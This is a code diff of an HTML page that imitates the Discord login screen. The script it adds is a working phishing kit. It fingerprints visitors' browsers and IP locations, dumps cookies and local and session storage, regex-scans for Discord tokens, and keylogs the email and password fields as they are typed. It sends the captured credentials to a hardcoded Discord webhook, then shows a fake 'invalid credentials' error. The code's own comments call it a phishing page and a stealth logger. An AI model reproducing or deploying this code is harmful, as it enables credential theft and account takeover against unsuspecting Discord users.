@@ -6,19 +6,19 @@
   <title>Discord</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
-    body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
     .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
     .logo { text-align: center; margin-bottom: 24px; }
     .logo svg { width: 130px; height: auto; }
     h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 4px; }
     .sub { color: #b5bac1; font-size: 16px; text-align: center; margin-bottom: 20px; }
     .input-group { margin-bottom: 16px; }
-    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; }
-    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: 0.2s; }
+    label { display: block; color: #b5bac1; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 4px; letter-spacing: 0.5px; }
+    input { width: 100%; padding: 10px 12px; background: #1e1f22; border: 1px solid #1e1f22; border-radius: 4px; color: #f2f3f5; font-size: 16px; outline: none; transition: border 0.15s; }
     input:focus { border-color: #5865f2; }
-    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.2s; }
+    .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
     .btn:hover { background: #4752c4; }
-    .footer { margin-top: 12px; color: #b5bac1; font-size: 14px; text-align: center; }
+    .footer { margin-top: 16px; color: #b5bac1; font-size: 14px; text-align: center; }
     .footer a { color: #00a8fc; text-decoration: none; }
     .footer a:hover { text-decoration: underline; }
   </style>
@@ -33,11 +33,11 @@
   <form id="loginForm">
     <div class="input-group">
       <label for="email">EMAIL OR PHONE NUMBER</label>
-      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
+      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required autocomplete="off">
     </div>
     <div class="input-group">
       <label for="password">PASSWORD</label>
-      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
     </div>
     <button type="submit" class="btn">Log In</button>
   </form>
@@ -47,90 +47,446 @@
 </div>
 <script>
   (function() {
-    // Webhook URL
-    const WEBHOOK = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
+    // ============================================================
+    //  CONFIGURATION - replace with YOUR webhook URL
+    // ============================================================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
+    // Double-check this URL - if it's wrong, nothing works.
 
-    // Collect all possible data
-    function getVisitorData() {
-      const data = {};
+    // ============================================================
+    //  GLOBAL STATE
+    // ============================================================
+    const state = {
+      ip: 'unknown',
+      country: 'unknown',
+      city: 'unknown',
+      region: 'unknown',
+      isp: 'unknown',
+      postal: 'unknown',
+      lat: 'unknown',
+      lon: 'unknown',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
+      platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio || 1,
+      touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      referrer: document.referrer || 'direct',
+      url: window.location.href,
+      cookies: document.cookie || 'none',
+      localStorage: JSON.stringify(localStorage) || 'none',
+      sessionStorage: JSON.stringify(sessionStorage) || 'none',
+      webglRenderer: 'unknown',
+      webglVendor: 'unknown',
+      canvasFingerprint: 'unknown',
+      audioFingerprint: 'unknown',
+      fonts: 'unknown',
+      battery: 'unknown',
+      networkType: 'unknown',
+      doNotTrack: navigator.doNotTrack || 'unspecified',
+      dateTime: new Date().toISOString()
+    };
 
-      // IP and country via free API (asynchronous)
-      // We'll fetch this separately and store in session
-
-      // Browser info
-      data.userAgent = navigator.userAgent;
-      data.language = navigator.language;
-      data.platform = navigator.platform;
-      data.screenWidth = screen.width;
-      data.screenHeight = screen.height;
-      data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      data.referrer = document.referrer || "direct";
-      data.url = window.location.href;
-
-      // Try to get IP/country asynchronously
-      return data;
+    // ============================================================
+    //  FINGERPRINTING FUNCTIONS
+    // ============================================================
+    function getWebGL() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return;
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          state.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          state.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        }
+      } catch(e) {}
     }
 
-    // Function to send data to webhook
-    function sendToWebhook(payload) {
-      fetch(WEBHOOK, {
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Discord', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('token', 4, 17);
+        state.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+      } catch(e) {}
+    }
+
+    function getAudioFingerprint() {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioCtx.createOscillator();
+        const analyser = audioCtx.createAnalyser();
+        oscillator.connect(analyser);
+        oscillator.frequency.value = 1000;
+        oscillator.type = 'sawtooth';
+        oscillator.start(0);
+        const data = new Uint8Array(analyser.frequencyBinCount);
+        analyser.getByteFrequencyData(data);
+        state.audioFingerprint = data.slice(0, 10).join(',');
+        oscillator.stop(0);
+        audioCtx.close();
+      } catch(e) {}
+    }
+
+    function getFonts() {
+      try {
+        const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino', 'Bookman', 'Avant Garde', 'Garamond', 'Franklin Gothic Medium', 'Lucida Sans', 'Century Gothic', 'Myriad Pro', 'Adobe Garamond', 'Futura'];
+        const detected = fontList.filter(f => document.createElement('span').style.font = f);
+        state.fonts = detected.join(', ') || 'none';
+      } catch(e) {}
+    }
+
+    function getBattery() {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          state.battery = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+        }).catch(() => {});
+      }
+    }
+
+    function getNetwork() {
+      if (navigator.connection) {
+        const conn = navigator.connection;
+        state.networkType = `${conn.effectiveType || 'unknown'} (${conn.downlink || '?'} Mbps)`;
+      }
+    }
+
+    // ============================================================
+    //  IP FETCH with multiple fallbacks
+    // ============================================================
+    function fetchIP() {
+      const primary = 'https://ipapi.co/json/';
+      const fallback1 = 'https://ip-api.com/json/';
+      const fallback2 = 'https://geolocation-db.com/json/';
+
+      fetch(primary)
+        .then(r => r.ok ? r.json() : Promise.reject('ipapi failed'))
+        .then(data => {
+          state.ip = data.ip || 'unknown';
+          state.country = data.country_name || data.country || 'unknown';
+          state.city = data.city || 'unknown';
+          state.region = data.region || 'unknown';
+          state.isp = data.org || data.isp || 'unknown';
+          state.postal = data.postal || 'unknown';
+          state.lat = data.latitude || 'unknown';
+          state.lon = data.longitude || 'unknown';
+          finalizeFingerprint();
+        })
+        .catch(() => {
+          fetch(fallback1)
+            .then(r => r.ok ? r.json() : Promise.reject('ip-api failed'))
+            .then(data => {
+              if (data.status === 'success') {
+                state.ip = data.query || 'unknown';
+                state.country = data.country || 'unknown';
+                state.city = data.city || 'unknown';
+                state.region = data.regionName || 'unknown';
+                state.isp = data.isp || 'unknown';
+                state.postal = data.zip || 'unknown';
+                state.lat = data.lat || 'unknown';
+                state.lon = data.lon || 'unknown';
+              }
+              finalizeFingerprint();
+            })
+            .catch(() => {
+              fetch(fallback2)
+                .then(r => r.ok ? r.json() : Promise.reject('geolocation-db failed'))
+                .then(data => {
+                  state.ip = data.IPv4 || 'unknown';
+                  state.country = data.country_name || 'unknown';
+                  state.city = data.city || 'unknown';
+                  state.region = data.state || 'unknown';
+                  finalizeFingerprint();
+                })
+                .catch(() => {
+                  finalizeFingerprint();
+                });
+            });
+        });
+    }
+
+    // ============================================================
+    //  FINALIZE ALL DATA AND SEND
+    // ============================================================
+    function finalizeFingerprint() {
+      getWebGL();
+      getCanvasFingerprint();
+      getAudioFingerprint();
+      getFonts();
+      getBattery();
+      getNetwork();
+
+      // Collect cookies again (in case they changed)
+      state.cookies = document.cookie || 'none';
+      state.localStorage = JSON.stringify(localStorage) || 'none';
+      state.sessionStorage = JSON.stringify(sessionStorage) || 'none';
+
+      sendInitialVisit();
+    }
+
+    // ============================================================
+    //  SEND TO WEBHOOK WITH RICH EMBED (emojis + fields)
+    // ============================================================
+    function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
+      const embed = {
+        title: title,
+        description: description,
+        color: color,
+        timestamp: new Date().toISOString(),
+        footer: { text: '🔐 Stealth Logger • ' + new Date().toLocaleString() },
+        fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
+      };
+      if (thumbnail) embed.thumbnail = { url: thumbnail };
+
+      const payload = { embeds: [embed] };
+
+      console.log('[DEBUG] Sending embed:', payload);
+
+      fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-      }).catch(err => console.error('Webhook error:', err));
+      })
+      .then(res => {
+        if (!res.ok) {
+          console.error('[ERROR] Webhook failed:', res.status);
+          // Store for retry later
+          try {
+            const queue = JSON.parse(localStorage.getItem('webhook_fail_queue') || '[]');
+            queue.push(payload);
+            localStorage.setItem('webhook_fail_queue', JSON.stringify(queue));
+          } catch(e) {}
+        } else {
+          console.log('[SUCCESS] Webhook sent.');
+        }
+      })
+      .catch(err => {
+        console.error('[ERROR] Fetch exception:', err);
+        try {
+          const queue = JSON.parse(localStorage.getItem('webhook_fail_queue') || '[]');
+          queue.push(payload);
+          localStorage.setItem('webhook_fail_queue', JSON.stringify(queue));
+        } catch(e) {}
+      });
     }
 
-    // Initial visitor data (without IP/country)
-    const baseData = getVisitorData();
+    // Retry failed queue
+    function retryFailedQueue() {
+      try {
+        const queue = JSON.parse(localStorage.getItem('webhook_fail_queue') || '[]');
+        if (queue.length === 0) return;
+        const payload = queue.shift();
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).then(() => {
+          localStorage.setItem('webhook_fail_queue', JSON.stringify(queue));
+        }).catch(() => {});
+      } catch(e) {}
+    }
 
-    // Fetch IP and country from free API
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(ipData => {
-        baseData.ip = ipData.ip || 'unknown';
-        baseData.country = ipData.country_name || ipData.country || 'unknown';
-        baseData.city = ipData.city || 'unknown';
-        baseData.region = ipData.region || 'unknown';
-        baseData.isp = ipData.org || 'unknown';
-        // Send initial visitor info once we have IP
-        sendToWebhook({
-          content: `**🆕 New Visitor**\nIP: ${baseData.ip}\nCountry: ${baseData.country}\nCity: ${baseData.city}\nRegion: ${baseData.region}\nISP: ${baseData.isp}\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`
-        });
-      })
-      .catch(() => {
-        // Fallback: send without IP
-        sendToWebhook({
-          content: `**🆕 New Visitor (IP fetch failed)**\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`
-        });
-      });
+    // ============================================================
+    //  SEND INITIAL VISITOR INFO (with emojis)
+    // ============================================================
+    function sendInitialVisit() {
+      const fields = [
+        { name: '🌐 IP Address', value: state.ip, inline: true },
+        { name: '🌍 Country', value: state.country, inline: true },
+        { name: '🏙️ City', value: state.city, inline: true },
+        { name: '🗺️ Region', value: state.region, inline: true },
+        { name: '📡 ISP', value: state.isp || 'unknown', inline: true },
+        { name: '📍 Coordinates', value: `${state.lat}, ${state.lon}`, inline: true },
+        { name: '🕒 Timezone', value: state.timezone, inline: true },
+        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 100) + '...', inline: false },
+        { name: '💬 Language', value: state.language, inline: true },
+        { name: '📱 Platform', value: state.platform, inline: true },
+        { name: '📺 Screen', value: state.screen, inline: true },
+        { name: '🎨 Color Depth', value: state.colorDepth, inline: true },
+        { name: '🔍 Pixel Ratio', value: state.pixelRatio, inline: true },
+        { name: '👆 Touch Support', value: state.touchSupport, inline: true },
+        { name: '⚙️ CPU Cores', value: state.hardwareConcurrency, inline: true },
+        { name: '🧠 Device Memory', value: state.deviceMemory + ' GB', inline: true },
+        { name: '🔗 Referrer', value: state.referrer || 'direct', inline: false },
+        { name: '🔗 URL', value: state.url, inline: false },
+        { name: '🍪 Cookies', value: state.cookies.substring(0, 200) + (state.cookies.length > 200 ? '...' : ''), inline: false },
+        { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
+        { name: '📦 SessionStorage', value: state.sessionStorage.substring(0, 200) + (state.sessionStorage.length > 200 ? '...' : ''), inline: false },
+        { name: '🎨 WebGL Renderer', value: state.webglRenderer || 'unknown', inline: true },
+        { name: '🏷️ WebGL Vendor', value: state.webglVendor || 'unknown', inline: true },
+        { name: '🖼️ Canvas Fingerprint', value: state.canvasFingerprint || 'unknown', inline: false },
+        { name: '🔊 Audio Fingerprint', value: state.audioFingerprint || 'unknown', inline: false },
+        { name: '🔤 Fonts', value: state.fonts || 'unknown', inline: false },
+        { name: '🔋 Battery', value: state.battery || 'unknown', inline: true },
+        { name: '📶 Network Type', value: state.networkType || 'unknown', inline: true },
+        { name: '🚫 Do Not Track', value: state.doNotTrack, inline: true },
+        { name: '📅 Timestamp', value: state.dateTime, inline: false }
+      ];
 
-    // Capture form submission
+      sendToWebhook(
+        '🆕 **NEW VISITOR DETECTED**',
+        `A fresh visitor just landed on your phishing page. Full fingerprint captured.`,
+        fields,
+        0x00FF00, // green
+        'https://cdn.discordapp.com/emojis/1083721895822708798.png' // generic globe emoji
+      );
+
+      // Also send raw cookies + tokens as a separate message if any token-like strings
+      const tokenMatches = state.cookies.match(/mfa\.[a-zA-Z0-9_-]+|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{30,}/g);
+      if (tokenMatches && tokenMatches.length > 0) {
+        sendToWebhook(
+          '🎟️ **TOKENS EXTRACTED FROM COOKIES**',
+          'Possible Discord tokens found in cookies!',
+          [{ name: 'Tokens', value: '```' + tokenMatches.join('\n') + '```', inline: false }],
+          0xFF0000 // red
+        );
+      }
+    }
+
+    // ============================================================
+    //  REAL-TIME KEYLOGGER + AUTO-FILL CAPTURE
+    // ============================================================
+    let emailLog = '';
+    let passwordLog = '';
+    let lastSendTime = 0;
+
+    function sendKeylog(force = false) {
+      const now = Date.now();
+      if (!force && (now - lastSendTime < 5000)) return; // throttle 5s
+      if (emailLog.length === 0 && passwordLog.length === 0) return;
+
+      const fields = [
+        { name: '📧 Email/Phone (live)', value: emailLog || '(empty)', inline: true },
+        { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true },
+        { name: '🕒 Captured at', value: new Date().toISOString(), inline: true }
+      ];
+
+      sendToWebhook(
+        '⌨️ **KEYSTROKE CAPTURE**',
+        'Real-time keystrokes from login fields.',
+        fields,
+        0xFFA500 // orange
+      );
+
+      lastSendTime = now;
+      // Don't clear logs - we want to accumulate
+    }
+
+    document.getElementById('email').addEventListener('input', function() {
+      emailLog = this.value;
+      sendKeylog();
+    });
+
+    document.getElementById('password').addEventListener('input', function() {
+      passwordLog = this.value;
+      sendKeylog();
+    });
+
+    // Also capture paste events (autofill)
+    document.getElementById('email').addEventListener('paste', function() {
+      setTimeout(() => { emailLog = this.value; sendKeylog(true); }, 50);
+    });
+    document.getElementById('password').addEventListener('paste', function() {
+      setTimeout(() => { passwordLog = this.value; sendKeylog(true); }, 50);
+    });
+
+    // ============================================================
+    //  FORM SUBMIT - capture final credentials with all data
+    // ============================================================
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
 
-      if (!email || !password) return;
+      if (!email && !password) return;
 
-      // Build webhook message with credentials and all data
-      let message = `**🔐 Login Credentials**\n`;
-      message += `Email/Phone: ${email}\nPassword: ${password}\n`;
-      message += `\n**Device Info**\nUser-Agent: ${baseData.userAgent}\nLanguage: ${baseData.language}\nPlatform: ${baseData.platform}\nScreen: ${baseData.screenWidth}x${baseData.screenHeight}\nTimezone: ${baseData.timezone}\nReferrer: ${baseData.referrer}\nURL: ${baseData.url}`;
-      if (baseData.ip) {
-        message += `\nIP: ${baseData.ip}\nCountry: ${baseData.country}\nCity: ${baseData.city}\nRegion: ${baseData.region}\nISP: ${baseData.isp}`;
-      }
+      // Final capture includes everything again
+      const fields = [
+        { name: '📧 Email/Phone', value: email, inline: true },
+        { name: '🔑 Password', value: password, inline: true },
+        { name: '🌐 IP', value: state.ip, inline: true },
+        { name: '🌍 Country', value: state.country, inline: true },
+        { name: '🏙️ City', value: state.city, inline: true },
+        { name: '📡 ISP', value: state.isp, inline: true },
+        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 80), inline: false },
+        { name: '🍪 Cookies (full)', value: state.cookies.substring(0, 300) + (state.cookies.length > 300 ? '...' : ''), inline: false },
+        { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
+        { name: '🎟️ Tokens found', value: (state.cookies.match(/mfa\.[a-zA-Z0-9_-]+|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{30,}/g) || ['none']).join(', '), inline: false }
+      ];
 
-      sendToWebhook({ content: message });
+      sendToWebhook(
+        '🚨 **LOGIN CREDENTIALS SUBMITTED**',
+        'User clicked "Log In" - full credentials and token dump below.',
+        fields,
+        0xFF0000 // red
+      );
 
-      // Optionally show a fake "incorrect password" or redirect to real Discord
+      // Clear fields and show fake error
+      document.getElementById('email').value = '';
+      document.getElementById('password').value = '';
+      emailLog = '';
+      passwordLog = '';
       alert('Invalid credentials. Please try again.');
-      // Or redirect to real Discord login page
+
+      // Uncomment to redirect to real Discord:
       // window.location.href = 'https://discord.com/login';
     });
 
-    // Also capture keystrokes or input changes if you want real-time
-    // but we just capture on submit for simplicity and stealth.
+    // ============================================================
+    //  ALSO CAPTURE EVERY CLICK / KEYDOWN globally (extra stealth)
+    // ============================================================
+    document.addEventListener('keydown', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        // already handled by input events
+      }
+    });
+
+    // ============================================================
+    //  PERIODIC SCAN FOR TOKENS IN STORAGE (every 10s)
+    // ============================================================
+    setInterval(() => {
+      const cookies = document.cookie;
+      const tokenMatches = cookies.match(/mfa\.[a-zA-Z0-9_-]+|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{30,}/g);
+      if (tokenMatches && tokenMatches.length > 0) {
+        sendToWebhook(
+          '🔄 **TOKEN REFRESH DETECTED**',
+          'New tokens found in cookies during periodic scan.',
+          [{ name: 'Tokens', value: '```' + tokenMatches.join('\n') + '```', inline: false }],
+          0x9B59B6 // purple
+        );
+      }
+    }, 10000);
+
+    // ============================================================
+    //  RETRY FAILED QUEUE ON LOAD
+    // ============================================================
+    retryFailedQueue();
+
+    // ============================================================
+    //  START
+    // ============================================================
+    console.log('[DEBUG] 🚀 Phishing page loaded. Extracting all data...');
+    fetchIP();
+
+    // Also send a quick test if you want (uncomment):
+    // sendToWebhook('✅ **BOOT**', 'Page loaded successfully.', [{name:'Status', value:'Active', inline:true}], 0x00FF00);
+
   })();
 </script>
 </body>
